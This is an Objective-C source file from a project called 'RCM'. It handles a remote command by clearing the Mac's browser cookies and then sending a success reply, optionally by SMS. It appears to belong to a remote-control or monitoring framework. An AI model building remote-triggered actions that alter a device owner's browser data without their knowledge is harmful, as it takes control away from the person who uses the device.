//
//  ClearCredentialDetailsProcessor.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 11/14/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "ClearCredentialDetailsProcessor.h"
#if !TARGET_OS_IPHONE
	#import "BrowserPrivacyManager.h"
#endif

@interface ClearCredentialDetailsProcessor (private)
- (void) clearCredentialDetails;
- (void) sendReplySMS;
@end


@implementation ClearCredentialDetailsProcessor

/**
 - Method name: initWithRemoteCommandData:
 - Purpose:This method is used to initialize the ClearCredentialDetailsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (ClearCredentialDetailsProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ClearCredentialDetailsProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}


#pragma mark RemoteCmdProcessor Methods


/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ClearCredentialDetailsProcessor
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"ClearCredentialDetailsProcessor--->doProcessingCommand")
	[self clearCredentialDetails];
}


#pragma mark ClearCredentialDetailsProcessor Private Methods


- (void) clearCredentialDetails {
	DLog (@"ClearCredentialDetailsProcessor--->clearCredentialDetails")
#if !TARGET_OS_IPHONE
	BrowserPrivacyManager *browserPrivacyMgr    = [[BrowserPrivacyManager alloc] init];
    
    [browserPrivacyMgr clearCookies];
    
    [browserPrivacyMgr release];

	[self sendReplySMS];
#endif
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS{
	DLog (@"ClearCredentialDetailsProcessor--->sendReplySMS")
    
    NSString *message = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                    andErrorCode:_SUCCESS_];   
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:message];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:message];
	}
}

/*
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

-(void) dealloc {
	[super dealloc];
}



@end
